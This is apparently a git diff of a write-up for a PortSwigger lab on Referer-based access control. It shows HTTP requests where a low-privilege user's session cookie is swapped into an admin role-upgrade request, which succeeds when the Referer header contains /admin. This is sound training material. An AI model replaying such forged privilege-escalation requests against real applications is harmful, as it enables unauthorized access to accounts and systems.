@@ -23,7 +23,7 @@ When we upgrade carlos user privileges, the request sent is as follows,
 ```http
 GET /admin-roles?username=carlos&action=upgrade HTTP/2
 Host: 0a9f0016047a441d81097f3e003900e8.web-security-academy.net
-Cookie: session=K7RG07YzVc1bZoX3UtsajKEb8WLuJHuf
+Cookie: session=j2REEeD3vHVXEKzXE7q1Hi98AQ2pCmsz
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -45,17 +45,18 @@ Our goal now is to upgrade ourselves
 
 Grab the cookie value of wiener.
 
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f3b2a7a1-0e41-43c4-9c81-58db4790dacf)
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/c0ffd4fc-b436-4d69-8ccc-3acc4adac1f2)
 
-Cookie of admin -  `DskvtWBTUNj8vQkHvNwgWeJYcBJFgB9M`
-Cookie of wiener - `YAAMI6aHIWowDUkZmG8TvjMnxSNZFKQy`
+
+Cookie of admin -  `j2REEeD3vHVXEKzXE7q1Hi98AQ2pCmsz`
+Cookie of wiener - `5u7PdoLWbATX6gzuN3kWxwBpsYbPC7dd`
 
 Send the request where the privileges were changed by admin but by replacing admin cookie with wiener's cookie (non-admin)
 
 ```http
 GET /admin-roles?username=carlos&action=upgrade HTTP/2
 Host: 0a9f0016047a441d81097f3e003900e8.web-security-academy.net
-Cookie: session=UpJMZ73RL6uyS9uiPIO2x0xY7SKFJVdA
+Cookie: session=5u7PdoLWbATX6gzuN3kWxwBpsYbPC7dd
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -69,20 +70,24 @@ Sec-Fetch-User: ?1
 Te: trailers
 ```
 
-But still we can't  as it shows only admin can perform this action,
-
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/abfc8f51-b694-484c-adb0-115355b3a600)
-
-
 The focus of this lab is , if referrer based verification is made, then we can explioit it
-
-#### Without /admin in referre header
-
-We get `401 - Unauthorized`
-
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/d0221021-2283-46c2-9c87-fecd81d2283c)
 
 #### With /admin in referrer header
 
 We get `302 - redirect`
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e136b2b4-c355-4cfa-abb0-699f5c526b90)
+
+#### Without /admin in referrer header
+
+We get `401 - Unauthorized`
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a884ecb4-5ca1-421f-96a1-6db2f5667f25)
+
+Thus we solved the lab by upgrading ourselves(wiener) to higher privilege.
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/c4d1440a-1f36-489f-b2fd-6dda2a93300d)
+
+
+
 
